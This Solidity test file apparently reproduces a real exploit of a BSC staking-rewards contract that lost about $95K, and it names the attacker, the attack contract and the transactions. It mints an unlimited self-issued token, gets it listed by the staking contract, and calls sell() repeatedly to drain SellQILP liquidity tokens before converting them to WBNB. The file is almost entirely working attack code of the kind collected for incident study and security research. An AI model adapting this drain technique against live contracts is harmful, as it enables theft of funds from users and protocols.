// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~95K US$
// Attacker : https://bscscan.com/address/0xc67af66b8a72d33dedd8179e1360631cf5169160
// Attack Contract : https://bscscan.com/address/0xf635fea87f0a8a444ede1dbb698d875dbb417829
// Vulnerable Contract : https://bscscan.com/address/0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675
// Attack Tx : https://bscscan.com/tx/0x59ed06fd0d44aec351bed54f57eccec65874da5a25a0aa71e348611710ec05f3
// Attack Tx : https://bscscan.com/tx/0x904e48ccc1a1eada85f2e3a6444debc428c55f8652ebbebe26e77d02be2902bf
// Attack Tx : https://bscscan.com/tx/0x247e61bd0f41f9ec56a99558e9bbb8210d6375c2ed6efa4663ee6a960349b46d

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675#code

// @Analysis
// Twitter Guy : https://twitter.com/AnciliaInc/status/1656337400329834496
// Twitter Guy : https://twitter.com/AnciliaInc/status/1656341587054702598

interface IStakingRewards {
    function addLiquidity(address _token, address token1, uint256 amount1) external;
    function sell(address token, address token1, uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 QIQI = IERC20(0x8121D345b16469F38Bd3b82EE2a547f6Be54f9C9);
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
    Uni_Router_V2 Router = Uni_Router_V2(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
    Uni_Router_V2 officalRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IStakingRewards StakingRewards = IStakingRewards(0x274b3e185c9c8f4ddEF79cb9A8dC0D94f73A7675);
    Uni_Pair_V2 SellQILP = Uni_Pair_V2(0x4cd4Bf5079Fc09d6989B4b5B42b113377AD8d565);
    Uni_Pair_V2 customLP;
    SHITCOIN MYTOKEN;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_092_673);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(QIQI), "QIQI");
        cheats.label(address(SELLC), "SELLC");
        cheats.label(address(Factory), "Factory");
        cheats.label(address(Router), "Router");
        cheats.label(address(officalRouter), "officalRouter");
        cheats.label(address(StakingRewards), "StakingRewards");
        cheats.label(address(SellQILP), "SellQILP");
    }

    function testExploit() public {
        deal(address(WBNB), address(this), 3 * 1e18);
        deal(address(QIQI), address(this), 3188 * 1e18);
        init();
        init2();
        process(23);

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function init() internal {
        WBNB.approve(address(officalRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SELLC);
        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( // swap 3 WBNB to SELLC
        3 * 1e18, 0, path, address(this), block.timestamp);
        SELLC.approve(address(Router), type(uint256).max);
        QIQI.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(SELLC),
            address(QIQI),
            SELLC.balanceOf(address(this)),
            QIQI.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        ); // add SELLC-QIQI Liquidity
        MYTOKEN = new SHITCOIN();
        MYTOKEN.mint(1 * 1e18);
        this.mint(100);
        this.approve(address(StakingRewards), type(uint256).max);
        StakingRewards.addLiquidity(address(this), address(MYTOKEN), 1e18); // add exploit contract address to listToken
        Factory.createPair(address(this), address(SellQILP));
        this.mint(1_000_000);
        this.approve(address(Router), type(uint256).max);
        SellQILP.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(this),
            address(SellQILP),
            1_000_000,
            SellQILP.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        ); // add customLP Liquidity
        customLP = Uni_Pair_V2(Factory.getPair(address(this), address(SellQILP)));
    }

    function init2() internal {
        this.mint(type(uint256).max);
        this.transfer(address(0x000000000000000000000000000000000000dEaD), 1000);
        for (uint256 i; i < 10; i++) {
            uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = address(SellQILP);
            uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
            StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // get SellQILP from StakingRewards
            Router.addLiquidity(
                address(this),
                address(SellQILP),
                100 * 1e18,
                SellQILP.balanceOf(address(this)),
                0,
                0,
                address(this),
                block.timestamp
            ); // add more SellQILP into customLP
        }
    }

    function process(uint256 amount) internal {
        uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(SellQILP);
        uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
        for (uint256 i; i < amount; i++) {
            StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // Get SellQILP from StakingRewards contract
        }
        SellQILP.transfer(address(SellQILP), SellQILP.balanceOf(address(this)));
        SellQILP.burn(address(this));
        SELLCToWBNB();
    }

    function SELLCToWBNB() internal {
        SELLC.approve(address(officalRouter), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SELLC);
        path[1] = address(WBNB);
        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    // ------------------- ERC20 interface ---------------------
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        // totalSupply += amount;
    }

    function totalSupply() external view returns (uint256) {
        return 100;
    }
}

contract SHITCOIN {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SHIT COIN";
    string public symbol = "SHIT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        // allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
